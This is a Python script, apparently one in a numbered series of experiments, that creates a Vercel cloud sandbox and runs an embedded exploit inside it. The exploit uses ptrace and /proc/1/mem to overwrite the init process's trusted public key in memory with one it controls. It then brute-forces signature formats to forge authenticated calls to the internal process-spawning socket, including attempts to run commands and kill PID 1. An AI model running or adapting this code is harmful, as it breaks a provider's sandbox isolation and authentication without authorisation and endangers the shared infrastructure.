# 实验J54: ptrace 修复(c_void_p) + 替换全部 pub-b64 + 签名格式系统爆破
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj54"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, base64, subprocess, json, time, ctypes, hashlib

PUB_B64 = "zBO7hUsIkDOrMW4VmKei/v0KlhZflnTw7RAYFeoT5uw="
PUB = base64.b64decode(PUB_B64)

os.makedirs("/tmp/k", exist_ok=True)
os.chdir("/tmp/k")
subprocess.run(["openssl", "genpkey", "-algorithm", "ed25519", "-out", "key.pem"], capture_output=True)
subprocess.run(["openssl", "pkey", "-in", "key.pem", "-pubout", "-out", "pub.pem"], capture_output=True)
MYPUB = subprocess.run(["openssl", "pkey", "-pubin", "-in", "pub.pem", "-outform", "DER"],
                       capture_output=True).stdout
i = MYPUB.rfind(b"\x03\x21\x00")
MYPUB32 = MYPUB[i+3:i+35]
MY_B64 = base64.b64encode(MYPUB32).decode()
print("my pub b64:", MY_B64, flush=True)

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    """data=None -> read read_len bytes; else write data. Returns (ok, result)."""
    libc.ptrace(16, 1, None, None)  # ATTACH
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

print("===== [1] ptrace 读写测试 =====", flush=True)
ok, out = ptrace_rw(0x400000, read_len=64)
print("peek 0x400000: ok=%d out=%r" % (ok, out[:16]), flush=True)
# 写回原值测试 @ 堆中 pub-b64 位置 (先找)
fd = os.open("/proc/1/mem", os.O_RDONLY)
maps = open("/proc/1/maps").read()
hits = []
for line in maps.splitlines():
    p = line.split()
    if len(p) < 2 or "r" not in p[1]:
        continue
    addr = p[0].split("-")
    start, end = int(addr[0], 16), int(addr[1], 16)
    if end - start > 256 * 1024 * 1024:
        continue
    try:
        os.lseek(fd, start, os.SEEK_SET)
        data = os.read(fd, min(end - start, 16 * 1024 * 1024))
    except Exception:
        continue
    idx = 0
    while True:
        j = data.find(PUB_B64.encode(), idx)
        if j < 0:
            break
        hits.append(start + j)
        idx = j + 1
os.close(fd)
print("pub-b64 hits:", [hex(h) for h in hits], flush=True)

# 先试写回原值 (同一地址, 验证 POKEDATA 能力)
if hits:
    okw, total = ptrace_rw(hits[0], data=PUB_B64.encode())
    print("POKEDATA write-back @ %s: %d/%d" % (hex(hits[0]), okw, total), flush=True)
    if okw == total:
        print("POKEDATA WRITE WORKS!", flush=True)

print("===== [2] 替换所有 pub-b64 拷贝 =====", flush=True)
ok_all = True
for h in hits:
    okw, total = ptrace_rw(h, data=MY_B64.encode())
    print("replace %s: %d/%d" % (hex(h), okw, total), flush=True)
    if okw != total:
        ok_all = False
print("all replaced:", ok_all, flush=True)
# 验证: 用 /proc/1/mem 读回
fd = os.open("/proc/1/mem", os.O_RDONLY)
os.lseek(fd, hits[0], os.SEEK_SET)
chk = os.read(fd, len(MY_B64))
os.close(fd)
print("readback: %r" % chk, flush=True)

print("===== [3] 签名格式系统爆破 =====", flush=True)
def ccall(path, body, hdrs, timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", body, "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

def sign(msg: bytes):
    with open("/tmp/k/msg.bin", "wb") as f:
        f.write(msg)
    r = subprocess.run(["openssl", "pkeyutl", "-sign", "-inkey", "/tmp/k/key.pem",
                        "-rawin", "-in", "/tmp/k/msg.bin", "-out", "/tmp/k/sig.bin"],
                       capture_output=True)
    if r.returncode != 0:
        return None
    return open("/tmp/k/sig.bin", "rb").read()

body_j = '{"command":"id"}'
candidates = []
tsf = lambda ts: ts
for name, fn in {
    "ts":            lambda ts, b: ts,
    "ts+body":       lambda ts, b: ts + b,
    "body+ts":       lambda ts, b: b + ts,
    "ts|body":       lambda ts, b: ts + "|" + b,
    "ts\\nbody":     lambda ts, b: ts + "\n" + b,
    "body\\nts":     lambda ts, b: b + "\n" + ts,
    "ts+path":       lambda ts, b: ts + "/vercel.sandbox.spawn.v1.SpawnService/Spawn",
    "path+ts":       lambda ts, b: "/vercel.sandbox.spawn.v1.SpawnService/Spawn" + ts,
    "POST+ts+body":  lambda ts, b: "POST" + ts + b,
    "ts+POST+body":  lambda ts, b: ts + "POST" + b,
    "sha256(ts+body)": lambda ts, b: hashlib.sha256((ts + b).encode()).hexdigest(),
    "sha256(body+ts)": lambda ts, b: hashlib.sha256((b + ts).encode()).hexdigest(),
    "md5(ts+body)":  lambda ts, b: hashlib.md5((ts + b).encode()).hexdigest(),
}.items():
    candidates.append((name, fn))

for name, fn in candidates:
    ts = str(int(time.time() * 1000))
    msg = fn(ts, body_j)
    sig = sign(msg.encode() if isinstance(msg, str) else msg)
    if sig is None:
        print("%-16s sign err" % name, flush=True)
        continue
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", body_j,
                {"x-timestamp": ts, "x-signature": base64.b64encode(sig).decode()})
    m = re.search(r'\{"error".*?\}', out)
    status = m.group(0) if m else ("NON-ERROR: " + out[-400:])
    print("%-16s -> %s" % (name, status), flush=True)

print("===== [4] Kill / Ping 尝试 =====", flush=True)
ts = str(int(time.time() * 1000))
for path, bd in [("/vercel.sandbox.spawn.v1.SpawnService/Kill", '{"process_id":"1"}'),
                 ("/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", '{"command":"id"}')]:
    sig = sign((ts + bd).encode())
    out = ccall(path, bd, {"x-timestamp": ts, "x-signature": base64.b64encode(sig).decode()})
    print("%s -> %s" % (path, out[:500]), flush=True)
'''
run_cmd(sid, SCAN, "ptrace-fix-pubkey-swap", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
